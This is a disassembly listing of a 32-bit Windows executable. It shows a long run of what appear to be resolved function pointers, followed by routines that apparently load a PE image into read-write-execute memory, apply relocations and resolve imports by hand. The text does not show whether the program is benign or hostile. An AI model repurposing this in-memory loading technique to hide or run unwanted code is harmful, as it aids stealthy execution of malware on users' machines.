  403262:	8b ce                	mov    %esi,%ecx
  403264:	a3 24 1d 44 00       	mov    %eax,0x441d24
  403269:	e8 31 e0 ff ff       	call   0x40129f
  40326e:	68 c0 39 43 00       	push   $0x4339c0
  403273:	8b ce                	mov    %esi,%ecx
  403275:	a3 e4 20 44 00       	mov    %eax,0x4420e4
  40327a:	e8 20 e0 ff ff       	call   0x40129f
  40327f:	68 90 39 43 00       	push   $0x433990
  403284:	8b ce                	mov    %esi,%ecx
  403286:	a3 78 1b 44 00       	mov    %eax,0x441b78
  40328b:	e8 0f e0 ff ff       	call   0x40129f
  403290:	68 7c 39 43 00       	push   $0x43397c
  403295:	8b ce                	mov    %esi,%ecx
  403297:	a3 14 1e 44 00       	mov    %eax,0x441e14
  40329c:	e8 fe df ff ff       	call   0x40129f
  4032a1:	68 4c 39 43 00       	push   $0x43394c
  4032a6:	8b ce                	mov    %esi,%ecx
  4032a8:	a3 c8 1b 44 00       	mov    %eax,0x441bc8
  4032ad:	e8 ed df ff ff       	call   0x40129f
  4032b2:	68 34 39 43 00       	push   $0x433934
  4032b7:	8b ce                	mov    %esi,%ecx
  4032b9:	a3 d0 1f 44 00       	mov    %eax,0x441fd0
  4032be:	e8 dc df ff ff       	call   0x40129f
  4032c3:	68 04 39 43 00       	push   $0x433904
  4032c8:	8b ce                	mov    %esi,%ecx
  4032ca:	a3 74 20 44 00       	mov    %eax,0x442074
  4032cf:	e8 cb df ff ff       	call   0x40129f
  4032d4:	68 f0 38 43 00       	push   $0x4338f0
  4032d9:	8b ce                	mov    %esi,%ecx
  4032db:	a3 6c 1e 44 00       	mov    %eax,0x441e6c
  4032e0:	e8 ba df ff ff       	call   0x40129f
  4032e5:	68 c0 38 43 00       	push   $0x4338c0
  4032ea:	8b ce                	mov    %esi,%ecx
  4032ec:	a3 80 1d 44 00       	mov    %eax,0x441d80
  4032f1:	e8 a9 df ff ff       	call   0x40129f
  4032f6:	68 b4 38 43 00       	push   $0x4338b4
  4032fb:	8b ce                	mov    %esi,%ecx
  4032fd:	a3 fc 1e 44 00       	mov    %eax,0x441efc
  403302:	e8 98 df ff ff       	call   0x40129f
  403307:	68 84 38 43 00       	push   $0x433884
  40330c:	8b ce                	mov    %esi,%ecx
  40330e:	a3 1c 1c 44 00       	mov    %eax,0x441c1c
  403313:	e8 87 df ff ff       	call   0x40129f
  403318:	68 70 38 43 00       	push   $0x433870
  40331d:	8b ce                	mov    %esi,%ecx
  40331f:	a3 b4 1f 44 00       	mov    %eax,0x441fb4
  403324:	e8 76 df ff ff       	call   0x40129f
  403329:	68 40 38 43 00       	push   $0x433840
  40332e:	8b ce                	mov    %esi,%ecx
  403330:	a3 f8 1b 44 00       	mov    %eax,0x441bf8
  403335:	e8 65 df ff ff       	call   0x40129f
  40333a:	68 2c 38 43 00       	push   $0x43382c
  40333f:	8b ce                	mov    %esi,%ecx
  403341:	a3 f8 1e 44 00       	mov    %eax,0x441ef8
  403346:	e8 54 df ff ff       	call   0x40129f
  40334b:	68 fc 37 43 00       	push   $0x4337fc
  403350:	8b ce                	mov    %esi,%ecx
  403352:	a3 7c 1d 44 00       	mov    %eax,0x441d7c
  403357:	e8 43 df ff ff       	call   0x40129f
  40335c:	68 e4 37 43 00       	push   $0x4337e4
  403361:	8b ce                	mov    %esi,%ecx
  403363:	a3 54 1d 44 00       	mov    %eax,0x441d54
  403368:	e8 32 df ff ff       	call   0x40129f
  40336d:	68 b4 37 43 00       	push   $0x4337b4
  403372:	8b ce                	mov    %esi,%ecx
  403374:	a3 1c 21 44 00       	mov    %eax,0x44211c
  403379:	e8 21 df ff ff       	call   0x40129f
  40337e:	a3 fc 1c 44 00       	mov    %eax,0x441cfc
  403383:	68 a0 37 43 00       	push   $0x4337a0
  403388:	8b ce                	mov    %esi,%ecx
  40338a:	e8 10 df ff ff       	call   0x40129f
  40338f:	68 70 37 43 00       	push   $0x433770
  403394:	8b ce                	mov    %esi,%ecx
  403396:	a3 3c 1c 44 00       	mov    %eax,0x441c3c
  40339b:	e8 ff de ff ff       	call   0x40129f
  4033a0:	68 60 37 43 00       	push   $0x433760
  4033a5:	8b ce                	mov    %esi,%ecx
  4033a7:	a3 c8 1e 44 00       	mov    %eax,0x441ec8
  4033ac:	e8 ee de ff ff       	call   0x40129f
  4033b1:	68 30 37 43 00       	push   $0x433730
  4033b6:	8b ce                	mov    %esi,%ecx
  4033b8:	a3 48 1b 44 00       	mov    %eax,0x441b48
  4033bd:	e8 dd de ff ff       	call   0x40129f
  4033c2:	68 1c 37 43 00       	push   $0x43371c
  4033c7:	8b ce                	mov    %esi,%ecx
  4033c9:	a3 ac 21 44 00       	mov    %eax,0x4421ac
  4033ce:	e8 cc de ff ff       	call   0x40129f
  4033d3:	68 ec 36 43 00       	push   $0x4336ec
  4033d8:	8b ce                	mov    %esi,%ecx
  4033da:	a3 98 20 44 00       	mov    %eax,0x442098
  4033df:	e8 bb de ff ff       	call   0x40129f
  4033e4:	68 e4 36 43 00       	push   $0x4336e4
  4033e9:	8b ce                	mov    %esi,%ecx
  4033eb:	a3 f8 21 44 00       	mov    %eax,0x4421f8
  4033f0:	e8 aa de ff ff       	call   0x40129f
  4033f5:	68 b4 36 43 00       	push   $0x4336b4
  4033fa:	8b ce                	mov    %esi,%ecx
  4033fc:	a3 40 1e 44 00       	mov    %eax,0x441e40
  403401:	e8 99 de ff ff       	call   0x40129f
  403406:	68 a8 36 43 00       	push   $0x4336a8
  40340b:	8b ce                	mov    %esi,%ecx
  40340d:	a3 2c 1b 44 00       	mov    %eax,0x441b2c
  403412:	e8 88 de ff ff       	call   0x40129f
  403417:	68 78 36 43 00       	push   $0x433678
  40341c:	8b ce                	mov    %esi,%ecx
  40341e:	a3 30 1d 44 00       	mov    %eax,0x441d30
  403423:	e8 77 de ff ff       	call   0x40129f
  403428:	68 6c 36 43 00       	push   $0x43366c
  40342d:	8b ce                	mov    %esi,%ecx
  40342f:	a3 20 1d 44 00       	mov    %eax,0x441d20
  403434:	e8 66 de ff ff       	call   0x40129f
  403439:	68 3c 36 43 00       	push   $0x43363c
  40343e:	8b ce                	mov    %esi,%ecx
  403440:	a3 9c 21 44 00       	mov    %eax,0x44219c
  403445:	e8 55 de ff ff       	call   0x40129f
  40344a:	68 30 36 43 00       	push   $0x433630
  40344f:	8b ce                	mov    %esi,%ecx
  403451:	a3 cc 1f 44 00       	mov    %eax,0x441fcc
  403456:	e8 44 de ff ff       	call   0x40129f
  40345b:	68 00 36 43 00       	push   $0x433600
  403460:	8b ce                	mov    %esi,%ecx
  403462:	a3 ac 22 44 00       	mov    %eax,0x4422ac
  403467:	e8 33 de ff ff       	call   0x40129f
  40346c:	68 e8 35 43 00       	push   $0x4335e8
  403471:	8b ce                	mov    %esi,%ecx
  403473:	a3 3c 1e 44 00       	mov    %eax,0x441e3c
  403478:	e8 22 de ff ff       	call   0x40129f
  40347d:	68 b8 35 43 00       	push   $0x4335b8
  403482:	8b ce                	mov    %esi,%ecx
  403484:	a3 d8 1f 44 00       	mov    %eax,0x441fd8
  403489:	e8 11 de ff ff       	call   0x40129f
  40348e:	68 ac 35 43 00       	push   $0x4335ac
  403493:	8b ce                	mov    %esi,%ecx
  403495:	a3 84 21 44 00       	mov    %eax,0x442184
  40349a:	e8 00 de ff ff       	call   0x40129f
  40349f:	68 7c 35 43 00       	push   $0x43357c
  4034a4:	8b ce                	mov    %esi,%ecx
  4034a6:	a3 74 1b 44 00       	mov    %eax,0x441b74
  4034ab:	e8 ef dd ff ff       	call   0x40129f
  4034b0:	68 60 35 43 00       	push   $0x433560
  4034b5:	8b ce                	mov    %esi,%ecx
  4034b7:	a3 d8 1d 44 00       	mov    %eax,0x441dd8
  4034bc:	e8 de dd ff ff       	call   0x40129f
  4034c1:	68 30 35 43 00       	push   $0x433530
  4034c6:	8b ce                	mov    %esi,%ecx
  4034c8:	a3 18 1c 44 00       	mov    %eax,0x441c18
  4034cd:	e8 cd dd ff ff       	call   0x40129f
  4034d2:	a3 90 1f 44 00       	mov    %eax,0x441f90
  4034d7:	68 10 35 43 00       	push   $0x433510
  4034dc:	8b ce                	mov    %esi,%ecx
  4034de:	e8 bc dd ff ff       	call   0x40129f
  4034e3:	68 fc 34 43 00       	push   $0x4334fc
  4034e8:	8b ce                	mov    %esi,%ecx
  4034ea:	a3 60 22 44 00       	mov    %eax,0x442260
  4034ef:	e8 ab dd ff ff       	call   0x40129f
  4034f4:	68 dc 34 43 00       	push   $0x4334dc
  4034f9:	8b ce                	mov    %esi,%ecx
  4034fb:	a3 7c 1b 44 00       	mov    %eax,0x441b7c
  403500:	e8 9a dd ff ff       	call   0x40129f
  403505:	68 c8 34 43 00       	push   $0x4334c8
  40350a:	8b ce                	mov    %esi,%ecx
  40350c:	a3 a0 1e 44 00       	mov    %eax,0x441ea0
  403511:	e8 89 dd ff ff       	call   0x40129f
  403516:	68 ac 34 43 00       	push   $0x4334ac
  40351b:	8b ce                	mov    %esi,%ecx
  40351d:	a3 1c 1b 44 00       	mov    %eax,0x441b1c
  403522:	e8 78 dd ff ff       	call   0x40129f
  403527:	68 98 34 43 00       	push   $0x433498
  40352c:	8b ce                	mov    %esi,%ecx
  40352e:	a3 74 1f 44 00       	mov    %eax,0x441f74
  403533:	e8 67 dd ff ff       	call   0x40129f
  403538:	68 84 34 43 00       	push   $0x433484
  40353d:	8b ce                	mov    %esi,%ecx
  40353f:	a3 0c 1c 44 00       	mov    %eax,0x441c0c
  403544:	e8 56 dd ff ff       	call   0x40129f
  403549:	68 70 34 43 00       	push   $0x433470
  40354e:	8b ce                	mov    %esi,%ecx
  403550:	a3 7c 20 44 00       	mov    %eax,0x44207c
  403555:	e8 45 dd ff ff       	call   0x40129f
  40355a:	68 60 34 43 00       	push   $0x433460
  40355f:	8b ce                	mov    %esi,%ecx
  403561:	a3 e8 1b 44 00       	mov    %eax,0x441be8
  403566:	e8 34 dd ff ff       	call   0x40129f
  40356b:	68 50 34 43 00       	push   $0x433450
  403570:	8b ce                	mov    %esi,%ecx
  403572:	a3 f8 1d 44 00       	mov    %eax,0x441df8
  403577:	e8 23 dd ff ff       	call   0x40129f
  40357c:	68 3c 34 43 00       	push   $0x43343c
  403581:	8b ce                	mov    %esi,%ecx
  403583:	a3 94 22 44 00       	mov    %eax,0x442294
  403588:	e8 12 dd ff ff       	call   0x40129f
  40358d:	68 24 34 43 00       	push   $0x433424
  403592:	8b ce                	mov    %esi,%ecx
  403594:	a3 a4 21 44 00       	mov    %eax,0x4421a4
  403599:	e8 01 dd ff ff       	call   0x40129f
  40359e:	68 ec 33 43 00       	push   $0x4333ec
  4035a3:	8b ce                	mov    %esi,%ecx
  4035a5:	a3 60 1e 44 00       	mov    %eax,0x441e60
  4035aa:	e8 f0 dc ff ff       	call   0x40129f
  4035af:	68 bc 33 43 00       	push   $0x4333bc
  4035b4:	8b ce                	mov    %esi,%ecx
  4035b6:	a3 14 22 44 00       	mov    %eax,0x442214
  4035bb:	e8 df dc ff ff       	call   0x40129f
  4035c0:	68 a8 33 43 00       	push   $0x4333a8
  4035c5:	8b ce                	mov    %esi,%ecx
  4035c7:	a3 74 22 44 00       	mov    %eax,0x442274
  4035cc:	e8 ce dc ff ff       	call   0x40129f
  4035d1:	68 74 33 43 00       	push   $0x433374
  4035d6:	8b ce                	mov    %esi,%ecx
  4035d8:	a3 f0 1c 44 00       	mov    %eax,0x441cf0
  4035dd:	e8 bd dc ff ff       	call   0x40129f
  4035e2:	68 48 33 43 00       	push   $0x433348
  4035e7:	8b ce                	mov    %esi,%ecx
  4035e9:	a3 bc 20 44 00       	mov    %eax,0x4420bc
  4035ee:	e8 ac dc ff ff       	call   0x40129f
  4035f3:	5f                   	pop    %edi
  4035f4:	a3 fc 1f 44 00       	mov    %eax,0x441ffc
  4035f9:	5e                   	pop    %esi
  4035fa:	c3                   	ret
  4035fb:	55                   	push   %ebp
  4035fc:	8b ec                	mov    %esp,%ebp
  4035fe:	57                   	push   %edi
  4035ff:	ff 75 0c             	push   0xc(%ebp)
  403602:	6a 40                	push   $0x40
  403604:	6a 00                	push   $0x0
  403606:	56                   	push   %esi
  403607:	ff 55 08             	call   *0x8(%ebp)
  40360a:	83 c4 10             	add    $0x10,%esp
  40360d:	85 c0                	test   %eax,%eax
  40360f:	75 08                	jne    0x403619
  403611:	33 c0                	xor    %eax,%eax
  403613:	40                   	inc    %eax
  403614:	e9 8b 00 00 00       	jmp    0x4036a4
  403619:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  40361e:	66 39 06             	cmp    %ax,(%esi)
  403621:	75 7e                	jne    0x4036a1
  403623:	8b 46 3c             	mov    0x3c(%esi),%eax
  403626:	85 c0                	test   %eax,%eax
  403628:	74 77                	je     0x4036a1
  40362a:	ff 75 0c             	push   0xc(%ebp)
  40362d:	8d 7e 40             	lea    0x40(%esi),%edi
  403630:	68 f8 00 00 00       	push   $0xf8
  403635:	50                   	push   %eax
  403636:	57                   	push   %edi
  403637:	ff 55 08             	call   *0x8(%ebp)
  40363a:	83 c4 10             	add    $0x10,%esp
  40363d:	85 c0                	test   %eax,%eax
  40363f:	74 d0                	je     0x403611
  403641:	81 3f 50 45 00 00    	cmpl   $0x4550,(%edi)
  403647:	75 58                	jne    0x4036a1
  403649:	b8 0b 01 00 00       	mov    $0x10b,%eax
  40364e:	66 39 46 58          	cmp    %ax,0x58(%esi)
  403652:	75 4d                	jne    0x4036a1
  403654:	0f b7 46 46          	movzwl 0x46(%esi),%eax
  403658:	66 85 c0             	test   %ax,%ax
  40365b:	74 44                	je     0x4036a1
  40365d:	8b f8                	mov    %eax,%edi
  40365f:	6b ff 28             	imul   $0x28,%edi,%edi
  403662:	57                   	push   %edi
  403663:	89 be 40 01 00 00    	mov    %edi,0x140(%esi)
  403669:	e8 0d aa 01 00       	call   0x41e07b
  40366e:	59                   	pop    %ecx
  40366f:	89 86 38 01 00 00    	mov    %eax,0x138(%esi)
  403675:	85 c0                	test   %eax,%eax
  403677:	75 04                	jne    0x40367d
  403679:	6a 03                	push   $0x3
  40367b:	eb 26                	jmp    0x4036a3
  40367d:	0f b7 4e 54          	movzwl 0x54(%esi),%ecx
  403681:	ff 75 0c             	push   0xc(%ebp)
  403684:	8b 56 3c             	mov    0x3c(%esi),%edx
  403687:	8d 4c 11 18          	lea    0x18(%ecx,%edx,1),%ecx
  40368b:	57                   	push   %edi
  40368c:	51                   	push   %ecx
  40368d:	50                   	push   %eax
  40368e:	89 8e 3c 01 00 00    	mov    %ecx,0x13c(%esi)
  403694:	ff 55 08             	call   *0x8(%ebp)
  403697:	83 c4 10             	add    $0x10,%esp
  40369a:	f7 d8                	neg    %eax
  40369c:	1b c0                	sbb    %eax,%eax
  40369e:	40                   	inc    %eax
  40369f:	eb 03                	jmp    0x4036a4
  4036a1:	6a 02                	push   $0x2
  4036a3:	58                   	pop    %eax
  4036a4:	5f                   	pop    %edi
  4036a5:	5d                   	pop    %ebp
  4036a6:	c3                   	ret
  4036a7:	55                   	push   %ebp
  4036a8:	8b ec                	mov    %esp,%ebp
  4036aa:	51                   	push   %ecx
  4036ab:	24 02                	and    $0x2,%al
  4036ad:	53                   	push   %ebx
  4036ae:	57                   	push   %edi
  4036af:	0f be f8             	movsbl %al,%edi
  4036b2:	8b 86 38 01 00 00    	mov    0x138(%esi),%eax
  4036b8:	f7 df                	neg    %edi
  4036ba:	1b ff                	sbb    %edi,%edi
  4036bc:	33 c9                	xor    %ecx,%ecx
  4036be:	33 db                	xor    %ebx,%ebx
  4036c0:	66 3b 4e 46          	cmp    0x46(%esi),%cx
  4036c4:	73 29                	jae    0x4036ef
  4036c6:	8d 48 0c             	lea    0xc(%eax),%ecx
  4036c9:	0f b7 46 46          	movzwl 0x46(%esi),%eax
  4036cd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4036d0:	8b 51 fc             	mov    -0x4(%ecx),%edx
  4036d3:	85 d2                	test   %edx,%edx
  4036d5:	74 10                	je     0x4036e7
  4036d7:	8b 01                	mov    (%ecx),%eax
  4036d9:	3b c7                	cmp    %edi,%eax
  4036db:	73 02                	jae    0x4036df
  4036dd:	8b f8                	mov    %eax,%edi
  4036df:	03 c2                	add    %edx,%eax
  4036e1:	3b c3                	cmp    %ebx,%eax
  4036e3:	76 02                	jbe    0x4036e7
  4036e5:	8b d8                	mov    %eax,%ebx
  4036e7:	83 c1 28             	add    $0x28,%ecx
  4036ea:	ff 4d fc             	decl   -0x4(%ebp)
  4036ed:	75 e1                	jne    0x4036d0
  4036ef:	8b 46 74             	mov    0x74(%esi),%eax
  4036f2:	6a 40                	push   $0x40
  4036f4:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4036f7:	29 7d fc             	sub    %edi,-0x4(%ebp)
  4036fa:	bb 00 30 00 00       	mov    $0x3000,%ebx
  4036ff:	53                   	push   %ebx
  403700:	ff 75 fc             	push   -0x4(%ebp)
  403703:	03 c7                	add    %edi,%eax
  403705:	50                   	push   %eax
  403706:	ff 15 6c 2f 45 00    	call   *0x452f6c
  40370c:	8b 4e 74             	mov    0x74(%esi),%ecx
  40370f:	89 86 48 01 00 00    	mov    %eax,0x148(%esi)
  403715:	89 8e 44 01 00 00    	mov    %ecx,0x144(%esi)
  40371b:	85 c0                	test   %eax,%eax
  40371d:	75 27                	jne    0x403746
  40371f:	f6 46 56 01          	testb  $0x1,0x56(%esi)
  403723:	74 05                	je     0x40372a
  403725:	6a 04                	push   $0x4
  403727:	58                   	pop    %eax
  403728:	eb 2c                	jmp    0x403756
  40372a:	6a 40                	push   $0x40
  40372c:	53                   	push   %ebx
  40372d:	ff 75 fc             	push   -0x4(%ebp)
  403730:	6a 00                	push   $0x0
  403732:	ff 15 6c 2f 45 00    	call   *0x452f6c
  403738:	89 86 48 01 00 00    	mov    %eax,0x148(%esi)
  40373e:	2b c7                	sub    %edi,%eax
  403740:	89 86 44 01 00 00    	mov    %eax,0x144(%esi)
  403746:	8b 86 48 01 00 00    	mov    0x148(%esi),%eax
  40374c:	f7 d8                	neg    %eax
  40374e:	1b c0                	sbb    %eax,%eax
  403750:	83 e0 fd             	and    $0xfffffffd,%eax
  403753:	83 c0 03             	add    $0x3,%eax
  403756:	5f                   	pop    %edi
  403757:	5b                   	pop    %ebx
  403758:	c9                   	leave
  403759:	c3                   	ret
  40375a:	55                   	push   %ebp
  40375b:	8b ec                	mov    %esp,%ebp
  40375d:	f6 45 10 02          	testb  $0x2,0x10(%ebp)
  403761:	75 25                	jne    0x403788
  403763:	8b 86 40 01 00 00    	mov    0x140(%esi),%eax
  403769:	ff 75 0c             	push   0xc(%ebp)
  40376c:	03 86 3c 01 00 00    	add    0x13c(%esi),%eax
  403772:	50                   	push   %eax
  403773:	6a 00                	push   $0x0
  403775:	ff b6 44 01 00 00    	push   0x144(%esi)
  40377b:	ff 55 08             	call   *0x8(%ebp)
  40377e:	83 c4 10             	add    $0x10,%esp
  403781:	85 c0                	test   %eax,%eax
  403783:	75 03                	jne    0x403788
  403785:	40                   	inc    %eax
  403786:	5d                   	pop    %ebp
  403787:	c3                   	ret
  403788:	8b 86 38 01 00 00    	mov    0x138(%esi),%eax
  40378e:	53                   	push   %ebx
  40378f:	33 c9                	xor    %ecx,%ecx
  403791:	33 db                	xor    %ebx,%ebx
  403793:	57                   	push   %edi
  403794:	66 3b 4e 46          	cmp    0x46(%esi),%cx
  403798:	73 39                	jae    0x4037d3
  40379a:	8d 78 10             	lea    0x10(%eax),%edi
  40379d:	8b 47 f8             	mov    -0x8(%edi),%eax
  4037a0:	8b 0f                	mov    (%edi),%ecx
  4037a2:	3b c1                	cmp    %ecx,%eax
  4037a4:	72 02                	jb     0x4037a8
  4037a6:	8b c1                	mov    %ecx,%eax
  4037a8:	85 c0                	test   %eax,%eax
  4037aa:	74 1b                	je     0x4037c7
  4037ac:	ff 75 0c             	push   0xc(%ebp)
  4037af:	50                   	push   %eax
  4037b0:	8b 47 fc             	mov    -0x4(%edi),%eax
  4037b3:	ff 77 04             	push   0x4(%edi)
  4037b6:	03 86 44 01 00 00    	add    0x144(%esi),%eax
  4037bc:	50                   	push   %eax
  4037bd:	ff 55 08             	call   *0x8(%ebp)
  4037c0:	83 c4 10             	add    $0x10,%esp
  4037c3:	85 c0                	test   %eax,%eax
  4037c5:	74 12                	je     0x4037d9
  4037c7:	0f b7 46 46          	movzwl 0x46(%esi),%eax
  4037cb:	43                   	inc    %ebx
  4037cc:	83 c7 28             	add    $0x28,%edi
  4037cf:	3b d8                	cmp    %eax,%ebx
  4037d1:	72 ca                	jb     0x40379d
  4037d3:	33 c0                	xor    %eax,%eax
  4037d5:	5f                   	pop    %edi
  4037d6:	5b                   	pop    %ebx
  4037d7:	5d                   	pop    %ebp
  4037d8:	c3                   	ret
  4037d9:	33 c0                	xor    %eax,%eax
  4037db:	40                   	inc    %eax
  4037dc:	eb f7                	jmp    0x4037d5
  4037de:	55                   	push   %ebp
  4037df:	8b ec                	mov    %esp,%ebp
  4037e1:	83 ec 0c             	sub    $0xc,%esp
  4037e4:	53                   	push   %ebx
  4037e5:	8b 5e 74             	mov    0x74(%esi),%ebx
  4037e8:	39 9e 44 01 00 00    	cmp    %ebx,0x144(%esi)
  4037ee:	75 07                	jne    0x4037f7
  4037f0:	33 c0                	xor    %eax,%eax
  4037f2:	e9 88 00 00 00       	jmp    0x40387f
  4037f7:	57                   	push   %edi
  4037f8:	8b be e0 00 00 00    	mov    0xe0(%esi),%edi
  4037fe:	85 ff                	test   %edi,%edi
  403800:	74 79                	je     0x40387b
  403802:	8b 8e e4 00 00 00    	mov    0xe4(%esi),%ecx
  403808:	85 c9                	test   %ecx,%ecx
  40380a:	74 6f                	je     0x40387b
  40380c:	8b 86 44 01 00 00    	mov    0x144(%esi),%eax
  403812:	8b d0                	mov    %eax,%edx
  403814:	03 c7                	add    %edi,%eax
  403816:	8d 4c 01 f8          	lea    -0x8(%ecx,%eax,1),%ecx
  40381a:	2b d3                	sub    %ebx,%edx
  40381c:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40381f:	3b c1                	cmp    %ecx,%eax
  403821:	73 50                	jae    0x403873
  403823:	8b 78 04             	mov    0x4(%eax),%edi
  403826:	83 ef 08             	sub    $0x8,%edi
  403829:	d1 ef                	shr    $1,%edi
  40382b:	8d 48 08             	lea    0x8(%eax),%ecx
  40382e:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  403831:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  403838:	74 31                	je     0x40386b
  40383a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40383d:	0f b7 09             	movzwl (%ecx),%ecx
  403840:	8b d9                	mov    %ecx,%ebx
  403842:	c1 eb 0c             	shr    $0xc,%ebx
  403845:	85 db                	test   %ebx,%ebx
  403847:	74 16                	je     0x40385f
  403849:	83 fb 03             	cmp    $0x3,%ebx
  40384c:	75 29                	jne    0x403877
  40384e:	8b 9e 44 01 00 00    	mov    0x144(%esi),%ebx
  403854:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  40385a:	03 08                	add    (%eax),%ecx
  40385c:	01 14 19             	add    %edx,(%ecx,%ebx,1)
  40385f:	ff 45 f8             	incl   -0x8(%ebp)
  403862:	83 45 fc 02          	addl   $0x2,-0x4(%ebp)
  403866:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  403869:	72 cf                	jb     0x40383a
  40386b:	03 40 04             	add    0x4(%eax),%eax
  40386e:	3b 45 f4             	cmp    -0xc(%ebp),%eax
  403871:	72 b0                	jb     0x403823
  403873:	33 c0                	xor    %eax,%eax
  403875:	eb 07                	jmp    0x40387e
  403877:	6a 05                	push   $0x5
  403879:	eb 02                	jmp    0x40387d
  40387b:	6a 04                	push   $0x4
  40387d:	58                   	pop    %eax
  40387e:	5f                   	pop    %edi
  40387f:	5b                   	pop    %ebx
  403880:	c9                   	leave
  403881:	c3                   	ret
  403882:	55                   	push   %ebp
  403883:	8b ec                	mov    %esp,%ebp
  403885:	8b 86 c0 00 00 00    	mov    0xc0(%esi),%eax
  40388b:	83 ec 0c             	sub    $0xc,%esp
  40388e:	53                   	push   %ebx
  40388f:	57                   	push   %edi
  403890:	85 c0                	test   %eax,%eax
  403892:	0f 84 10 01 00 00    	je     0x4039a8
  403898:	83 be c4 00 00 00 00 	cmpl   $0x0,0xc4(%esi)
  40389f:	0f 84 03 01 00 00    	je     0x4039a8
  4038a5:	8b 9e 44 01 00 00    	mov    0x144(%esi),%ebx
  4038ab:	03 d8                	add    %eax,%ebx
  4038ad:	e9 eb 00 00 00       	jmp    0x40399d
  4038b2:	8b 8e 44 01 00 00    	mov    0x144(%esi),%ecx
  4038b8:	03 c8                	add    %eax,%ecx
  4038ba:	51                   	push   %ecx
  4038bb:	ff 15 10 30 43 00    	call   *0x433010
  4038c1:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4038c4:	85 c0                	test   %eax,%eax
  4038c6:	0f 84 e2 00 00 00    	je     0x4039ae
  4038cc:	8b 86 54 01 00 00    	mov    0x154(%esi),%eax
  4038d2:	39 86 50 01 00 00    	cmp    %eax,0x150(%esi)
  4038d8:	72 59                	jb     0x403933
  4038da:	85 c0                	test   %eax,%eax
  4038dc:	74 04                	je     0x4038e2
  4038de:	03 c0                	add    %eax,%eax
  4038e0:	eb 03                	jmp    0x4038e5
  4038e2:	6a 10                	push   $0x10
  4038e4:	58                   	pop    %eax
  4038e5:	89 86 54 01 00 00    	mov    %eax,0x154(%esi)
  4038eb:	c1 e0 02             	shl    $0x2,%eax
  4038ee:	50                   	push   %eax
  4038ef:	e8 87 a7 01 00       	call   0x41e07b
  4038f4:	8b f8                	mov    %eax,%edi
  4038f6:	59                   	pop    %ecx
  4038f7:	89 7d f4             	mov    %edi,-0xc(%ebp)
  4038fa:	85 ff                	test   %edi,%edi
  4038fc:	0f 84 b1 00 00 00    	je     0x4039b3
  403902:	8b 86 50 01 00 00    	mov    0x150(%esi),%eax
  403908:	85 c0                	test   %eax,%eax
  40390a:	74 13                	je     0x40391f
  40390c:	c1 e0 02             	shl    $0x2,%eax
  40390f:	50                   	push   %eax
  403910:	ff b6 4c 01 00 00    	push   0x14c(%esi)
  403916:	57                   	push   %edi
  403917:	e8 34 a8 01 00       	call   0x41e150
  40391c:	83 c4 0c             	add    $0xc,%esp
  40391f:	ff b6 4c 01 00 00    	push   0x14c(%esi)
  403925:	e8 e5 a7 01 00       	call   0x41e10f
  40392a:	59                   	pop    %ecx
  40392b:	89 be 4c 01 00 00    	mov    %edi,0x14c(%esi)
  403931:	eb 03                	jmp    0x403936
  403933:	8b 7d f4             	mov    -0xc(%ebp),%edi
  403936:	8b 86 50 01 00 00    	mov    0x150(%esi),%eax
  40393c:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40393f:	89 0c 87             	mov    %ecx,(%edi,%eax,4)
  403942:	ff 86 50 01 00 00    	incl   0x150(%esi)
  403948:	8b 86 44 01 00 00    	mov    0x144(%esi),%eax
  40394e:	8b 7b 10             	mov    0x10(%ebx),%edi
  403951:	03 f8                	add    %eax,%edi
  403953:	83 7b 04 00          	cmpl   $0x0,0x4(%ebx)
  403957:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40395a:	74 35                	je     0x403991
  40395c:	8b 0b                	mov    (%ebx),%ecx
  40395e:	85 c9                	test   %ecx,%ecx
  403960:	74 55                	je     0x4039b7
  403962:	03 c8                	add    %eax,%ecx
  403964:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  403967:	eb 28                	jmp    0x403991
  403969:	79 05                	jns    0x403970
  40396b:	0f b7 c0             	movzwl %ax,%eax
  40396e:	eb 0a                	jmp    0x40397a
  403970:	8b 8e 44 01 00 00    	mov    0x144(%esi),%ecx
  403976:	8d 44 08 02          	lea    0x2(%eax,%ecx,1),%eax
  40397a:	50                   	push   %eax
  40397b:	ff 75 f8             	push   -0x8(%ebp)
  40397e:	ff 15 0c 30 43 00    	call   *0x43300c
  403984:	89 07                	mov    %eax,(%edi)
  403986:	85 c0                	test   %eax,%eax
  403988:	74 24                	je     0x4039ae
  40398a:	83 45 fc 04          	addl   $0x4,-0x4(%ebp)
  40398e:	83 c7 04             	add    $0x4,%edi
  403991:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403994:	8b 00                	mov    (%eax),%eax
  403996:	85 c0                	test   %eax,%eax
  403998:	75 cf                	jne    0x403969
  40399a:	83 c3 14             	add    $0x14,%ebx
  40399d:	8b 43 0c             	mov    0xc(%ebx),%eax
  4039a0:	85 c0                	test   %eax,%eax
  4039a2:	0f 85 0a ff ff ff    	jne    0x4038b2
  4039a8:	33 c0                	xor    %eax,%eax
  4039aa:	5f                   	pop    %edi
  4039ab:	5b                   	pop    %ebx
  4039ac:	c9                   	leave
  4039ad:	c3                   	ret
  4039ae:	6a 06                	push   $0x6
  4039b0:	58                   	pop    %eax
  4039b1:	eb f7                	jmp    0x4039aa
  4039b3:	6a 03                	push   $0x3
  4039b5:	eb f9                	jmp    0x4039b0
  4039b7:	6a 08                	push   $0x8
  4039b9:	eb f5                	jmp    0x4039b0
  4039bb:	55                   	push   %ebp
  4039bc:	8b ec                	mov    %esp,%ebp
  4039be:	51                   	push   %ecx
  4039bf:	8b 87 38 01 00 00    	mov    0x138(%edi),%eax
  4039c5:	53                   	push   %ebx
  4039c6:	33 c9                	xor    %ecx,%ecx
  4039c8:	33 db                	xor    %ebx,%ebx
  4039ca:	56                   	push   %esi
  4039cb:	66 3b 4f 46          	cmp    0x46(%edi),%cx
  4039cf:	73 7f                	jae    0x403a50
  4039d1:	8d 70 24             	lea    0x24(%eax),%esi
  4039d4:	8b 06                	mov    (%esi),%eax
